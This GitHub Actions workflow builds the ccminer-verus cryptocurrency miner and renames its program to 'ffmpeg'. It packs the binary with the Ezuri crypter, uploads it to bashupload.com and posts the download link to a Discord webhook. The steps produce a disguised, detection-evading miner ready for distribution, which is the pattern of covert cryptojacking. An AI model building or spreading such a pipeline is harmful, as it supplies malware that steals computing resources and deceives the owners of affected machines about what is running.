name: Build ccminer

on:
  push:
    branches:
      - main
  pull_request:
    branches:
      - main

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v3

    - name: Install Dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y cmake git build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake libgmp-dev libtool clang libelf-dev zlib1g-dev

    - name: Install Go 1.23
      run: |
        wget https://go.dev/dl/go1.23.0.linux-amd64.tar.gz
        sudo tar -C /usr/local -xzf go1.23.0.linux-amd64.tar.gz
        sudo echo "export PATH=$PATH:/usr/local/go/bin" >> $GITHUB_ENV

    - name: Clone and Modify ccminer
      run: |
        git clone https://github.com/Oink70/ccminer-verus.git
        cd ccminer-verus
        sed -i 's/#define PROGRAM_NAME.*/#define PROGRAM_NAME "ffmpeg"/g' ccminer.cpp

    - name: Configure and Build ccminer
      run: |
        cd ccminer-verus
        ./autogen.sh
        ./configure
        make -j$(nproc)

    - name: Clone and Fix Ezuri go.mod
      run: |
        git clone --branch v0.0.2 https://github.com/guitmz/ezuri.git
        cd ezuri
        sed -i 's/1.23.0/1.23/g' go.mod # Fix Go version in go.mod
        go mod tidy # Ensure dependencies are correct
        go build

    - name: Pack with Ezuri
      run: |
        cd ezuri
        ./ezuri ../ccminer-verus/ccminer
        mv ../ccminer-verus/ccminer ../ccminer-verus/ffmpeg

    - name: Create Tarball
      run: |
        cd ../ccminer-verus
        tar -cvf ffmpeg.tar ffmpeg

    - name: Upload to Bashupload
      run: |
        curl -T ./ffmpeg.tar https://bashupload.com/ > upload_url.txt

    - name: Send URL to Discord Webhook
      run: |
        UPLOAD_URL=$(cat upload_url.txt | grep -o 'https://bashupload.com/[^\"]*')
        curl -H "Content-Type: application/json" -X POST \
        -d "{\"content\":\"$UPLOAD_URL\"}" ${{ secrets.DISCORD_WEBHOOK }}
